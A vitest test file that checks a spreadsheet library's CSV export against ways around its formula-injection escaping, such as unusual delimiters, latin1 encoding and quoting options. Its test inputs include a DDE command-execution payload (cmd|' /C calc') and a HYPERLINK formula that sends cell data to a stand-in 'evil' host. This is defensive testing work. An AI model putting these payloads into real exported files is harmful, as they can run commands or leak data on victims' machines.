// Ways around the CSV formula-injection escape found by the 1.2.2 penetration tests (docs/decisions.md
// D-J01): a delimiter that starts a formula (a line whose first field is empty starts with it), the
// latin1 encoding of @xlvane/exceljs (characters above U+00FF lose their high byte, so U+013D becomes
// "=" and U+010A a line feed after the check), and formatter options whose quoting a standard
// (RFC 4180) reader splits differently. Each test parses the output as RFC 4180 and checks that no
// field starts like a formula, or that the options are refused.
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import ExcelJS from '../../packages/exceljs/src/index';
import { toCSV } from '../../packages/xlvane/src/csv';
import { createWorkbook, writeWorkbook } from '../../packages/xlvane/src/index';
import { expectXlvError } from '../helpers/expect-error';

/** Fields of RFC 4180 text with the given delimiter (quotes doubled inside quoted fields). */
function parse(text: string, delimiter = ','): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let quoted = false;
  let i = 0;
  while (i < text.length) {
    const c = text[i]!;
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') {
        field += '"';
        i += 2;
        continue;
      }
      if (c === '"') quoted = false;
      else field += c;
      i++;
      continue;
    }
    if (c === '"' && field === '') quoted = true;
    else if (c === delimiter) {
      row.push(field);
      field = '';
    } else if (c === '\n' || c === '\r') {
      if (c === '\r' && text[i + 1] === '\n') i++;
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
    } else field += c;
    i++;
  }
  if (field !== '' || row.length > 0) rows.push([...row, field]);
  return rows;
}

const FORMULA = /^[=+\-@\t\r＝＋－＠﹦﹢﹣﹫]/;

/** Whether a line of the text starts with a formula character (what a reader sees first). */
const lineStarts = (text: string): boolean => text.split(/\r\n|\n|\r/).some((line) => FORMULA.test(line));

describe('toCSV: a delimiter that starts a formula', () => {
  const book = (() => {
    const wb = createWorkbook();
    const s = wb.addSheet('S');
    s.set('B1', "cmd|' /C calc'!A0");
    s.set('B2', 'SUM(1;2)');
    return writeWorkbook(wb);
  })();

  for (const d of ['=', '+', '-', '@', '＝', '＋', '－', '＠', '﹦', '﹢', '﹣', '﹫']) {
    it(`refuses delimiter ${JSON.stringify(d)} while formulas are escaped`, () => {
      const error = expectXlvError(() => toCSV(book, { delimiter: d }), 'XLV_E_INVALID_OPTION');
      expect(error.details?.option).toBe('delimiter');
    });
  }

  it('accepts it with formulaInjection "off", and keeps tab, ";" and "|"', () => {
    // The field is quoted because it holds "|" (CSV-14); the line still starts with the delimiter.
    expect(toCSV(book, { delimiter: '=', formulaInjection: 'off' })).toContain(`="cmd|' /C calc'!A0"`);
    for (const d of ['\t', ';', '|', ',']) expect(lineStarts(toCSV(book, { delimiter: d }).replace(/^\t/gm, ''))).toBe(false);
  });
});

describe('@xlvane/exceljs: latin1 output', () => {
  const values = ['ĽHYPERLINK("http://evil/","x")', 'ī1+1', 'okĊ=1+2Ĭ3', 'ŀx', 'ĭx', 'café'];

  it('writes characters above U+00FF as "?" before the fields are checked and quoted', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'xlvane-csv-latin1-'));
    try {
      const wb = new ExcelJS.Workbook();
      wb.addWorksheet('S').addRow(values);
      await wb.csv.writeFile(join(dir, 'a.csv'), { encoding: 'latin1' } as never);
      const text = new TextDecoder('latin1').decode(await readFile(join(dir, 'a.csv')));
      const rows = parse(text);
      expect(rows).toHaveLength(1);
      expect(rows[0]).toEqual(['?HYPERLINK("http://evil/","x")', '?1+1', 'ok?=1+2?3', '?x', '?x', 'café']);
      for (const f of rows[0]!) expect(FORMULA.test(f)).toBe(false);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('refuses formatter options outside latin1', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'xlvane-csv-latin1-'));
    try {
      const wb = new ExcelJS.Workbook();
      wb.addWorksheet('S').addRow(['a', 'b']);
      await expect(wb.csv.writeFile(join(dir, 'a.csv'), { encoding: 'latin1', formatterOptions: { delimiter: 'Ĭ' } } as never)).rejects.toMatchObject({ code: 'XLV_E_INVALID_OPTION' });
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('@xlvane/exceljs: formatter options that a standard reader splits differently', () => {
  const write = async (values: string[], formatterOptions: Record<string, unknown>): Promise<string> => {
    const wb = new ExcelJS.Workbook();
    wb.addWorksheet('S').addRow(values);
    return new TextDecoder().decode((await wb.csv.writeBuffer({ formatterOptions } as never)) as Uint8Array);
  };

  for (const escape of ['\\', '', "'"]) {
    it(`refuses escape ${JSON.stringify(escape)} other than the quote while formulas are escaped`, async () => {
      await expect(write([`x",=cmd|' /C calc'!A0,"`, 'tail'], { escape })).rejects.toMatchObject({ code: 'XLV_E_INVALID_OPTION', details: { option: 'escape' } });
    });
  }

  it('refuses with quote: false a field that starts with a double quote', async () => {
    await expect(write(['"=1+1"', 'tail'], { quote: false })).rejects.toMatchObject({ code: 'XLV_E_INVALID_OPTION' });
    expect(await write(['say "hi"', 'tail'], { quote: false })).toBe('say "hi",tail');
  });

  for (const delimiter of ['=', '+', '-', '@', '=;']) {
    it(`refuses delimiter ${JSON.stringify(delimiter)} while formulas are escaped`, async () => {
      await expect(write(['', 'SUM(1;2)'], { delimiter })).rejects.toMatchObject({ code: 'XLV_E_INVALID_OPTION', details: { option: 'delimiter' } });
    });
  }

  it('keeps exceljs behaviour with formulaInjection "off" and with the default options', async () => {
    const wb = new ExcelJS.Workbook();
    wb.addWorksheet('S').addRow([`x",=cmd`, 'tail']);
    const off = new TextDecoder().decode((await wb.csv.writeBuffer({ formulaInjection: 'off', formatterOptions: { escape: '\\' } } as never)) as Uint8Array);
    expect(off).toBe('"x\\",=cmd",tail');
    const rows = parse(await write([`x",=cmd|' /C calc'!A0,"`, '=1', 'tail'], {}));
    expect(rows).toHaveLength(1);
    for (const f of rows[0]!) expect(FORMULA.test(f)).toBe(false);
  });
});

describe('@xlvane/exceljs: more formatter options (independent review of the patch, D-J01)', () => {
  const write = async (rows: string[][], formatterOptions: Record<string, unknown>): Promise<string> => {
    const wb = new ExcelJS.Workbook();
    const ws = wb.addWorksheet('S');
    for (const r of rows) ws.addRow(r);
    return new TextDecoder().decode((await wb.csv.writeBuffer({ formatterOptions } as never)) as Uint8Array);
  };
  const refused = [
    ['quote', { quote: "'" }],
    ['quote', { quote: '\n' }],
    ['quote', { quote: '=' }],
    ['quote', { quote: '-', quoteColumns: true }],
    ['rowDelimiter', { rowDelimiter: '\n=' }],
    ['rowDelimiter', { rowDelimiter: ';' }],
    ['delimiter', { delimiter: ',\n=1+1,' }],
    ['delimiter', { delimiter: '\t=' }],
    ['delimiter', { delimiter: ',\u0000' }],
  ] as const;
  for (const [option, fo] of refused) {
    it(`refuses ${JSON.stringify(fo)} while formulas are escaped`, async () => {
      await expect(write([['a\n=HYPERLINK("http://evil/?"&A1)\n', 'b'], ['c,=SUM(1)\n', 'd']], fo)).rejects.toMatchObject({ code: 'XLV_E_INVALID_OPTION', details: { option } });
    });
  }

  it('keeps the usual options: tab, ";" and "|" delimiters, CRLF or CR rows, quote false', async () => {
    for (const fo of [{ delimiter: '\t' }, { delimiter: ';' }, { delimiter: '|' }, { rowDelimiter: '\r\n' }, { rowDelimiter: '\r' }, { quote: false }, { quote: '"', escape: '"' }]) {
      await expect(write([['a', 'b']], fo)).resolves.toContain('a');
    }
  });
});
